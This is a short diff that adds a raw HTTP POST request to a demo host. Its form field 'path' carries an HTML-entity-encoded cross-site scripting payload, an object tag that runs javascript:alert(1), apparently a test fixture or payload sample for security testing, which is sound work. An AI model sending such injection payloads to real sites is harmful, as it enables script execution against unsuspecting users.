@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+Connection: close
+
+path=&#x3C;object data=&#x22;javascript:alert(1)&#x22;&#x3E;
